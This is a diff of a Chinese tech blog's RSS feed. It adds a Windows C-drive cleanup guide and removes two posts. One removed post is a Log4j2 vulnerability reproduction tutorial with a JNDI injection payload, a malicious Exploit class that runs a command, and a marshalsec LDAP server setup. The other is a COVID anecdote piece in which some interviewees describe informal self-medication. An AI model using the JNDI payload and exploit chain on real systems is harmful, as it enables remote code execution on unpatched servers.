+&lt;li&gt;选择要删除的文件类型，例如缓存、下载的文件等。&lt;/li&gt;
+&lt;li&gt;点击“删除文件”按钮。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;b&gt;3. 卸载不需要的软件&lt;/b&gt;&lt;br&gt;有时一些不常用的程序占据了大量的磁盘空间。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;打开“设置”应用，选择应用 &amp;gt; 应用和功能。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;查找不常用的程序，点击它，然后选择卸载。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;b&gt;4. 清理浏览器缓存&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;浏览器缓存也会占用不少空间，定期清理这些缓存有助于释放磁盘空间。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Google Chrome：进入设置 &amp;gt; 高级 &amp;gt; 隐私与安全 &amp;gt; 清除浏览数据。&lt;/li&gt;
+&lt;li&gt;Microsoft Edge：设置 &amp;gt; 隐私、搜索和服务 &amp;gt; 清除浏览数据。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;b&gt;5. 关闭休眠功能&lt;/b&gt;&lt;br&gt;如果你不需要休眠功能，可以关闭它，因为休眠文件（hiberfil.sys）占用的空间有时会很大。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;打开命令提示符（管理员），输入以下命令：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;powercfg -h off&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;按回车键，这将禁用休眠功能并删除hiberfil.sys文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;b&gt;6. 移动文件到其他驱动器&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;如果C盘空间仍然紧张，你可以将大文件（如视频、图片和文档）移动到其他磁盘分区或外部硬盘。&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;7. 使用第三方工具&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;一些第三方工具也可以帮助你清理C盘并优化磁盘空间，例如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CCleaner：清理系统垃圾文件和注册表。&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://windirstat.net/download.html&#34;&gt;WinDirStat&lt;/a&gt;：分析磁盘空间占用情况，找出大文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;b&gt;8. 删除系统还原点&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;如果你启用了系统还原，可能会存有很多还原点占用磁盘空间。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;右键点击此电脑，选择属性。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;点击系统保护，选择C盘，然后点击配置。&lt;/li&gt;
+&lt;li&gt;在弹出的窗口中，点击“删除”来删除旧的还原点。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;b&gt;9. 清理Windows更新文件&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;Windows更新可能会留下不必要的安装文件。&lt;/p&gt;
+&lt;p&gt;在磁盘清理工具中，点击“清理系统文件”，选择Windows更新清理，然后清理过时的更新文件。&lt;/p&gt;
+&lt;p&gt;通过以上步骤，你可以释放C盘的空间，使你的Windows 10系统运行得更加顺畅。&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -1574,10 +1528,10 @@
             <guid isPermalink="true">https://erik.xyz/2023/11/12/xhprof-plugs/</guid>
             <title>xhprof插件开发</title>
             <link>https://erik.xyz/2023/11/12/xhprof-plugs/</link>
+            <category>composer</category>
             <category>xhprof</category>
             <category>webman</category>
             <category>laravel</category>
-            <category>composer</category>
             <category>composer插件</category>
             <pubDate>Sun, 12 Nov 2023 21:51:00 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;最近开发后总要测试接口性能，来定位接口问题，突然想到有xhprof扩展可以用。翻了翻，发现多数要不代码不更新，要不就是太繁琐，干脆自己开发以下。&lt;/p&gt;
@@ -2150,123 +2104,6 @@ sink:
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;原文来源：blog.csdn.net/wuzhiwei549/article/details/122758937&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://erik.xyz/2023/01/11/hand-and-hand-log4j/</guid>
-            <title>手把手教你复现 Log4j2 漏洞</title>
-            <link>https://erik.xyz/2023/01/11/hand-and-hand-log4j/</link>
-            <category>漏洞</category>
-            <category>log4j2</category>
-            <pubDate>Wed, 11 Jan 2023 22:19:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h4 id=&#34;1-简介&#34;&gt;&lt;a href=&#34;#1-简介&#34; class=&#34;headerlink&#34; title=&#34;1.简介&#34;&gt;&lt;/a&gt;1.简介&lt;/h4&gt;&lt;p&gt;ApacheLog4j2是一个开源的Java日志框架，被广泛地应用在中间件、开发框架与Web应用中。&lt;/p&gt;
-&lt;h4 id=&#34;2-漏洞概述&#34;&gt;&lt;a href=&#34;#2-漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;2.漏洞概述&#34;&gt;&lt;/a&gt;2.漏洞概述&lt;/h4&gt;&lt;p&gt;该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h4 id=&#34;3-影响范围&#34;&gt;&lt;a href=&#34;#3-影响范围&#34; class=&#34;headerlink&#34; title=&#34;3.影响范围&#34;&gt;&lt;/a&gt;3.影响范围&lt;/h4&gt;&lt;p&gt;Apache Log4j 2.x &amp;lt;= 2.15.0-rc1&lt;/p&gt;
-&lt;h4 id=&#34;4-环境搭建&#34;&gt;&lt;a href=&#34;#4-环境搭建&#34; class=&#34;headerlink&#34; title=&#34;4.环境搭建&#34;&gt;&lt;/a&gt;4.环境搭建&lt;/h4&gt;&lt;p&gt;1、创建一个新的maven项目，并导入Log4j的依赖包&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h5 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h5&gt;&lt;p&gt;1、使用POC测试&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import org.apache.logging.log4j.LogManager;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       import org.apache.logging.log4j.Logger;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       class LogTest &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           public static final Logger logger = LogManager.getLogger();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           public static void main(String[] args) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               logger.error(&amp;quot;$&amp;#123;jndi:ldap://localhost:8888/Exploit&amp;#125;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;2、编译一恶意类Exploit.class&lt;/p&gt;
-&lt;p&gt;首先新建exp.java，然后编译为class文件&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class Exploit &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    static &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.err.println(&amp;quot;Pwned&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String cmds = &amp;quot;calc&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Runtime.getRuntime().exec(cmds);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch ( Exception e ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javac exp.java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;3、使用marshalsec-0.0.3-SNAPSHOT-all.jar本地开启一个LDAP服务&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;http://127.0.0.1:7777/#Exploit&amp;quot; 8888&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&#34;/img/202301/20230211220751.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4、运行poc.java，即可访问恶意类并执行写在其中的”calc”命令 &lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/img/202301/20230211221053.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;结合一些其它 StrLookup 适当变形，以及配合官方测试用例中脏数据”?Type=A Type&amp;amp;Name=1100110&amp;amp;Char=!”可绕过rc1，RC2版本对此异常进行了捕获。&lt;br&gt;&lt;img src=&#34;/img/202301/20230211221141.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;h4 id=&#34;5-修复方式&#34;&gt;&lt;a href=&#34;#5-修复方式&#34; class=&#34;headerlink&#34; title=&#34;5.修复方式&#34;&gt;&lt;/a&gt;5.修复方式&lt;/h4&gt;&lt;p&gt;目前，Apache官方已发布新版本完成漏洞修复，建议用户尽快进行自查，并及时升级至最新版本：&lt;a href=&#34;https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2&#34;&gt;https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2&lt;/a&gt; 建议同时采用如下临时措施进行漏洞防范：&lt;/p&gt;
-&lt;p&gt;1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；&lt;/p&gt;
-&lt;p&gt;2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；&lt;/p&gt;
-&lt;p&gt;3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；&lt;/p&gt;
-&lt;p&gt;4）部署使用第三方防火墙产品进行安全防护。&lt;/p&gt;
-&lt;p&gt;链接：&lt;a href=&#34;https://blog.csdn.net/qq_40989258/article/details/121862363&#34;&gt;https://blog.csdn.net/qq_40989258/article/details/121862363&lt;/a&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://erik.xyz/2022/12/16/in-guan-bingd-du/</guid>
-            <title>新冠真就是流感而已么？我问了四个阳了的朋友。。。</title>
-            <link>https://erik.xyz/2022/12/16/in-guan-bingd-du/</link>
-            <category>转载</category>
-            <category>杂录</category>
-            <category>新冠肺炎</category>
-            <pubDate>Fri, 16 Dec 2022 09:54:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;这段时间，各地新冠感染人数都在暴增，&lt;strong&gt;大家出门记得戴口罩&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;这几天，咱编辑部也充满了风雨欲来的危机感，不过，办公室刚出现病例，咱们就迅速进行了一个居家办公，所以目前情况还不错。&lt;/p&gt;
-&lt;p&gt;但即便如此，我们每天讨论最多的话题，仍然是新冠，不仅仅是编辑部，差评君在的大部分群聊里也是这个状况。&lt;/p&gt;
-&lt;p&gt;“ 听说现在新冠跟流感一样了？”&lt;/p&gt;
-&lt;p&gt;“ 抢到药了么？我咋到处买不到药？”&lt;/p&gt;
-&lt;p&gt;“ 现在得新冠还会有啥后遗症么？”&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;连花清瘟都快变 “ 硬通货 ” 了  ▼&lt;br&gt;&lt;img src=&#34;/img/202212/640.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;随着开放，大家开始直面新冠，但大多数人对于新冠却还没有真正的了解，心里多少有一些担心。&lt;/p&gt;
-&lt;p&gt;抱着一丝好奇，差评君翻阅了一些国内外的论文以及相关报道，并且抓着身边几位不幸中招的朋友们聊了一聊他们的「 新冠历程 」。&lt;/p&gt;
-&lt;p&gt; 希望通过这篇文章，帮助大家迅速对新冠有个初步的了解。&lt;/p&gt;
-&lt;p&gt;首先，&lt;strong&gt;还是先介绍下基本情况&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;从今年 1 月份开始，中国大部分地区流行的都是&lt;strong&gt;「 奥密克戎 」&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;不同地区流行的具体变异株不同，北京流行的变异株以 BF.7 为主，广州流行的以 BA 5.2 为主，它们都属于奥密克戎的不同分支，所以病毒毒性、致病力和传染性没有显著变化，&lt;strong&gt;不存在南北毒性不同，疾病表现不同可能是个体差异导致&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;至于那些 “ 丑的容易得，漂亮的不容易得 ” 的论调，要么咱听听就好&lt;br&gt; &lt;img src=&#34;/img/202212/640.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;感染奥密克戎后主要是&lt;strong&gt;无症状&lt;/strong&gt;和&lt;strong&gt;轻症&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;轻症的定义是：出现中低度发热、咽痛、鼻塞等上呼吸道感染症状，以及乏力、嗅（味）觉障碍等症状，但是没有肺炎表现。&lt;/p&gt;
-&lt;p&gt; 所以，对于大部分人来说，奥密克戎并不可怕。&lt;/p&gt;
-&lt;p&gt;但，注意，&lt;strong&gt;像老年人、有基础病的人、免疫力差的人&lt;/strong&gt;容易出现重症。&lt;/p&gt;
-&lt;p&gt;钟院士在内的多个专家表示，99% 的病人&lt;strong&gt;一周左右&lt;/strong&gt;可以康复，而只要感染过，无论有无症状，3-6 个月内二次感染的概率极低。&lt;br&gt;&lt;img src=&#34;/img/202212/qwe21.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这些数据看起来很生硬，&lt;strong&gt;所以差评君干脆联系了身边 4 位阳了的朋友，问了一下他们的生病感受&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;接下来是他们的讲述，为了方便阅读，差评君做了简单整理。&lt;/p&gt;
-&lt;h1 id=&#34;1-铁头-坐标北京&#34;&gt;&lt;a href=&#34;#1-铁头-坐标北京&#34; class=&#34;headerlink&#34; title=&#34;1 铁头 坐标北京&#34;&gt;&lt;/a&gt;1 铁头 坐标北京&lt;/h1&gt;&lt;p&gt;由于女朋友阳了，所以有预感自己也会。&lt;/p&gt;
-&lt;p&gt;从开始到结束差不多是&lt;strong&gt;7天&lt;/strong&gt;，第 1 天就嗓子微微不舒服，类似平时上火的感觉，有预感压不住第二天会发烧那种。&lt;/p&gt;
-&lt;p&gt;第 2 天还是第 3 天开始，头晕发烧，不过这会测出来还是阴性，发烧 38.5°。&lt;/p&gt;
-&lt;p&gt;接下来两三天一直在浑浑噩噩中度过，身上特别疼，就是健身后那种肌肉酸疼，咋待着都不舒服，感觉被打了一顿，脖子也疼，腰也疼，不能受力。&lt;/p&gt;
-&lt;p&gt;后来就是比较常规的，咳嗽。&lt;/p&gt;
-&lt;p&gt;到了第七天，就是嗓子什么有点不舒服。&lt;br&gt;&lt;img src=&#34;/img/202212/640qwe23.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;个人感受就是没啥食欲，每天没有胃口，就光喝水，也没有怎么吃药，全程就吃了一粒布洛芬。&lt;/p&gt;
-&lt;p&gt;比较头疼的是，北京外卖很迟缓，可能是外卖员也都阳了吧，买点水，等一个小时，配送费是 30。&lt;/p&gt;
-&lt;p&gt;建议就是拖时间 ，喝水，喝宝矿力，一定一定要多喝水。&lt;/p&gt;
-&lt;p&gt;我对象比我先阳，也先好，现在已经开始上班了，整个生病的时间周期跟我差不多。&lt;br&gt;&lt;img src=&#34;/img/202212/342gfhhhhhhhht45.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;2-导演-坐标北京&#34;&gt;&lt;a href=&#34;#2-导演-坐标北京&#34; class=&#34;headerlink&#34; title=&#34;2 导演 坐标北京&#34;&gt;&lt;/a&gt;2 导演 坐标北京&lt;/h1&gt;&lt;p&gt;我是上周日开始不舒服的，但是今天（周二）已经快好了。&lt;/p&gt;
-&lt;p&gt;周日上午起来觉得身体有点迟钝，有点冷，腰酸脖子酸。吃完午饭就感觉自己快发烧了，下午直接烧到 39.5 度，来得很快。&lt;/p&gt;
-&lt;p&gt;烧了估计有 24 个小时，都是接近 40 度，人基本也跟昏迷差不多了，除了喝水和躺着睡觉啥也干不了。&lt;br&gt;&lt;img src=&#34;/img/202212/dfg3415.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;周一下午开始有点退烧，到 38 度左右，开始能吃东西了。&lt;/p&gt;
-&lt;p&gt;吃东西反正除了咸味，其他什么味道也吃不出来。朋友给我买了个黄桃罐头，吃那个味道还是有的。但是我吃饭时，刚咀嚼第一口整个口腔的肌肉特别酸痛，疼的嗷嗷叫。&lt;/p&gt;
-&lt;p&gt;再之后就是烧开始慢慢退，但是身上的酸痛感也越来越严重，越来越普遍。&lt;/p&gt;
-&lt;p&gt;今天起来（周二）彻底退烧，喉咙还有些疼，还有就是浑身像被人揍了一顿，稍微动一下就疼的厉害，不动也会疼，实在受不了了中午吃了颗布洛芬。&lt;/p&gt;
-&lt;p&gt;今天吃了两顿饭，味觉基本恢复，大约下午 3 点多我感觉精神上也恢复得差不多了，身体虽然有点笨重，但不是很疼了，嗓子吞咽的时候稍稍有点感觉，但不明显，不良反应几乎是没有了。&lt;/p&gt;
-&lt;p&gt;就感觉已经好的差不多可以继续打工了。。。&lt;br&gt;&lt;img src=&#34;/img/202212/123dfgyt55.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;3-嘉嘉-坐标北京&#34;&gt;&lt;a href=&#34;#3-嘉嘉-坐标北京&#34; class=&#34;headerlink&#34; title=&#34;3 嘉嘉 坐标北京&#34;&gt;&lt;/a&gt;3 嘉嘉 坐标北京&lt;/h1&gt;&lt;p&gt;上周五睡觉的时候还正常的，周六凌晨突然烧的不行了，半夜被冻醒（实际是发烧），出汗出的衣服都湿透了，但还是感觉冷。&lt;/p&gt;
-&lt;p&gt;没有体温计，不知道自己烧成啥也了，发烧之前就是感觉嗓子有点痒。&lt;/p&gt;
-&lt;p&gt;从周六到现在（周二）就是头昏、咳嗽、恶心想吐以及流鼻涕，然后还有就是犯困，我没有全身疼。&lt;br&gt;&lt;img src=&#34;/img/202212/3678fh.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我是一直有吃药的，拆开吃，疼就吃布洛芬，发热就连花清瘟，嗓子难受就头孢，一次吃一种，7小时后根据情况再吃（ 注，此处不构成医疗建议，仅为个人用药习惯 ），吃药的确会缓解一些难受。&lt;/p&gt;
-&lt;p&gt;主要还是靠喝水吧，一天喝 4.5L 水，因为刚好是买的桶装水，所以水量特别清晰。&lt;/p&gt;
-&lt;p&gt;生活没啥大影响，就是没有力气打游戏了，有人是吃东西没有味道，我是吃啥都觉得咸，麻辣烫就疯狂兑水。&lt;br&gt;&lt;img src=&#34;/img/202212/sfgr687.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;4-徐哥-坐标广州&#34;&gt;&lt;a href=&#34;#4-徐哥-坐标广州&#34; class=&#34;headerlink&#34; title=&#34;4 徐哥 坐标广州&#34;&gt;&lt;/a&gt;4 徐哥 坐标广州&lt;/h1&gt;&lt;p&gt;自广州全面放开，大家似乎就也都放开了，我自己也有心理预期，觉得这事迟早要来，症状严重与否，纯粹看「 命 」，只不过没想到这么快。&lt;/p&gt;
-&lt;p&gt;我是上周末开始的，目前第三天，整体对比网上相对轻微的。&lt;/p&gt;
-&lt;p&gt;星期天白天嗓子略痒，但也不是很明显。到了晚上睡前全身酸痛无力、头很疼、全身发冷，广州盖了两床厚被子，穿了厚的秋衣裤，睡觉还是觉得冷。一整晚没怎么睡好。&lt;/p&gt;
-&lt;p&gt;周一中午做了抗原，测出来阳了。这天的情况跟第一天一样，睡了一整天，吃不下饭，就啃了下馒头，有味的东西吃着就恶心。&lt;/p&gt;
-&lt;p&gt;今天早上起来酸痛感、头疼感有舒缓，但下午感觉又严重了，但整体比第一天好，另外就是咳嗽、咳痰。&lt;/p&gt;
-&lt;p&gt;目前为止还没发烧，所以吃药方面目前就是吃连花清瘟胶囊+消炎药，另外多喝水，泡 VC 泡腾片和电解质粉。&lt;br&gt;&lt;img src=&#34;/img/202212/werwe4389.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;以上就是他们的讲述。&lt;/p&gt;
-&lt;p&gt;当然，这些个例不具有统计学意义，仅仅只是帮助大家了解一下如果你得了新冠，有可能会经历啥。&lt;/p&gt;
-&lt;p&gt;接下来，也结合一些国外的论文，给大家聊聊&lt;strong&gt;「 再感染 」&lt;/strong&gt;跟&lt;strong&gt;「 后遗症 」&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;根据英国官方的数据，奥密克戎的确会带来更多的再感染，在所有确定的再感染中，93.4% 发生在奥密克戎大流行期间。&lt;/p&gt;
-&lt;p&gt;但，别着急，根据统计，&lt;strong&gt;只有不到 6.75% 的感染者发生了再感染&lt;/strong&gt;。概率是很低的。&lt;br&gt;&lt;img src=&#34;/img/202212/fhtrry3455.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;一方面暴露在不同的毒株下，可能会重复感染，一方面即便是同一毒株上次感染形成的抗体浓度降低以后，也可能重复感染。&lt;br&gt;&lt;img src=&#34;/img/202212/sfer321.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt; 关于「 后遗症 」，目前奥密克戎出现的时间太短，刚过一年，所以国内外对其后遗症的研究成果都比较有限。&lt;/p&gt;
-&lt;p&gt;今年 5 月，有位印度学者研究了 53 位奥密克戎感染康复者，在这 53 位患者中，28.3% ，84.9% 和 56.6% 的人康复后分别经历了流鼻涕，发烧和喉咙痛，但是症状都没有持续超过两个月。&lt;/p&gt;
-&lt;p&gt;根据@丁香园的报道，有研究指出奥密克戎毒株后遗症发生率仅是 Delta 毒株的 24～50%（接种疫苗的情况下）。由于该数据截至 2021 年末，当时还未进入奥密克戎大流行，目前以奥密克戎感染为主的情况下，新冠后遗症比例可能比研究中呈现的更低。&lt;/p&gt;
-&lt;p&gt;最后，简单聊下，大家可以做一些什么预防新冠呢？&lt;/p&gt;
-&lt;p&gt;勤洗手这些都算是老调常谈了，此外好好休息，可以考虑常备一些药物在家，具体的药物建议，可以参考人民日报发布的《&lt;strong&gt;新冠病毒感染者用药目录&lt;/strong&gt;》。&lt;br&gt;&lt;img src=&#34;/img/202212/dgfgh67868.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这里只强调一点，&lt;strong&gt;不要 “ 病急乱投医 ”，避免重复用药、超剂量用药等情况&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;举个栗子，很多人可能同时备有乙酰氨基酚跟布洛芬，这两种药尽量不要同时使用，否则有一定可能导致急性肝衰竭。再比如使用布洛芬退烧的时候，需要每次间隔 6 小时，等等。&lt;/p&gt;
-&lt;p&gt; 用药禁忌可以查看北京协和医院等权威医疗机构发布的信息。&lt;/p&gt;
-&lt;p&gt;其他的一些基本事项，可以参考官方《&lt;strong&gt;新冠病毒感染者居家指引&lt;/strong&gt;》。&lt;br&gt;&lt;img src=&#34;/img/202212/qwe76867.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;&lt;img src=&#34;/img/202212/fghgffffffft7686.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
-&lt;p&gt;基本上相关信息网络上都能获取，大家注意找权威、靠谱的信息来源就行。&lt;/p&gt;
